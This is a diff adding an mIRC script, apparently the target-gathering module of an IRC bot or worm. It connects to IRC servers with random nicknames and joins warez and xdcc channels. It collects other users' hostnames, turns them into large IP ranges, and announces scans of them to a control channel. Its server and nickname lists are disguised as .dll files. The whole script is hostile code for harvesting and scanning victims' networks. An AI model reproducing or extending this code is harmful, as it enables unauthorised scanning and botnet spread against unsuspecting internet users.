@@ -1,0 +1,23 @@
+on 1:sockclose:SIPG: { timerSIPG 1 30 SIPG }
+on 1:sockopen:SIPG:{  if ($sockerr > 0) { return } |  unset %spigscan | timerCSPIG off | set %stopscan no | unset %Scan.Range.* | unset %SIPG* |  sockwrite -n SIPG USER $read(users.dll) $+ $rand(1,9) $read(users.dll) $+ $rand(1,9)  $read(users.dll) $+ $rand(1,9)  $read(users.dll) $+ $rand(1,9) |  sockwrite -n SIPG NICK $read(users.dll) $+ $rand(1,999) $+ $rand(a,z) }
+on 1:sockread:SIPG:{
+  if ($sockerr > 0) { return } | sockread %SIPGread | if ($sockbr == 0) { return } 
+  echo -a %sipgread
+  if ($gettok(%SIPGread,1,32) == ping) { sockwrite -n SIPG PONG $gettok(%SIPGread,2-,32) }
+  if ($gettok(%SIPGread,2,32) == kick) { sockwrite -n SIPG join $gettok(%SIPGread,3,32) }
+  if ($gettok(%SIPGread,2,32) == 433) { sockwrite -n SIPG nick $read(users.dll) }
+  if ($gettok(%SIPGread,2,32) == 001) ||  ($gettok(%SIPGread,2,32) == 474)  { sockwrite -n SIPG join $gettok(#xdcc #x-dcc #divx-movies #warez-central #FTP-XDCC #123warez #mp3_collective #movieland #movie-planet #HQ-DVDS #xxx #hardrock&metalmp3 #xxxpasswd,$r(1,13),32) }
+  if ($gettok(%SIPGread,2,32) == 471) ||  ($gettok(%SIPGread,2,32) == 474)  { sockwrite -n SIPG join $gettok(#xdcc #x-dcc #divx-movies #warez-central #FTP-XDCC #123warez #mp3_collective #movieland #movie-planet #HQ-DVDS #xxx #hardrock&metalmp3 #xxxpasswd,$r(1,13),32) }
+  if ($gettok(%SIPGread,2,32) == 474) ||  ($gettok(%SIPGread,2,32) == 474)  { sockwrite -n SIPG join $gettok(#xdcc #x-dcc #divx-movies #warez-central #FTP-XDCC #123warez #mp3_collective #movieland #movie-planet #HQ-DVDS #xxx #hardrock&metalmp3 #xxxpasswd,$r(1,13),32) }
+  if ($gettok(%SIPGread,2,32) == 475) ||  ($gettok(%SIPGread,2,32) == 474)  { sockwrite -n SIPG join $gettok(#xdcc #x-dcc #divx-movies #warez-central #FTP-XDCC #123warez #mp3_collective #movieland #movie-planet #HQ-DVDS #xxx #hardrock&metalmp3 #xxxpasswd,$r(1,13),32) }
+  if ($gettok(%SIPGread,2,32) == 473) ||  ($gettok(%SIPGread,2,32) == 474)  { sockwrite -n SIPG join $gettok(#xdcc #x-dcc #divx-movies #warez-central #FTP-XDCC #123warez #mp3_collective #movieland #movie-planet #HQ-DVDS #xxx #hardrock&metalmp3 #xxxpasswd,$r(1,13),32) }
+  if ($gettok(%SIPGread,2,32) == 366) { sockwrite -n SIPG who %getscan }
+  if ($gettok(%SIPGread,2,32) == 315) || (%SIPGnum >= 5) { sockclose SIPG | return }
+  if ($gettok(%SIPGread,2,32) == 352) { if ($gettok(%SIPGread,8,32) != $host) && ($gettok(%SIPGread,7,32) != $ip) && (*.undernet.org !iswm $gettok(%SIPGread,6,32)) {  inc %SIPGnum | set %SIPG. [ $+ [ %SIPGnum ] ] $gettok(%SIPGread,6,32) | dns $gettok(%SIPGread,6,32) }
+  }
+}
+alias SIPG { if ($sock(SIPG)) { sockclose SIPG } | sockopen SIPG $read(ipservers.dll) 6667 } 
+alias spigscan { set %stopscan no | set %silentscan on | inc %spigscan | if (%spigscan >= 5) { unset %spigscan | sipg } | set %begshortip $gettok( [ %Scan.Range. [ $+ [ %spigscan ] ] ] ,1,32)  | set %beglongip $longip(  %begshortip ) | set %endshortip $gettok( [ %Scan.Range. [ $+ [ %spigscan ] ] ] ,2,32)  | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | msg %chan 2[14DT-GT2]14 starting scan from: [ %begshortip to %endshortip ]  * $+ . $+ $gettok([ %sipg. [ $+ [ %spigscan ] ] ],$count([ %sipg. [ $+ [ %spigscan ] ] ],.) $+ -,46) | startscan }
+alias spigscan2 { set %stopscan no | set %silentscan on | inc %spigscan | if (%spigscan >= 5) { set %begshortip moreips | unset %spigscan | SIPG } | if (%begshortip !== moreips) { set %begshortip $gettok( [ %Scan.Range. [ $+ [ %spigscan ] ] ] ,1,32)  | set %beglongip $longip(  %begshortip ) | set %endshortip $gettok( [ %Scan.Range. [ $+ [ %spigscan ] ] ] ,2,32)  | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | msg %chan 2[14DT-GT2]14 starting scan from: [ %begshortip to %endshortip ] * $+ . $+ $gettok([ %sipg. [ $+ [ %spigscan ] ] ],$count([ %sipg. [ $+ [ %spigscan ] ] ],.) $+ -,46) | startscan }  | else { msg %chan 2[14DT-GT2]14 Getting new ips } }
+on *:dns: { haltdef | timerspigscan 1 10 spigscan | if ($iaddress) { if ($iaddress == $ip) { return } | inc %SIPGdns | set %Scan.Range. [ $+ [ %SIPGdns ] ] $gettok($iaddress,1-2,46) $+ .0.0 $gettok($iaddress,1,46) $+ . $+ $calc($gettok($iaddress,2,46)+10) $+ .255.255 | return } } }
+}
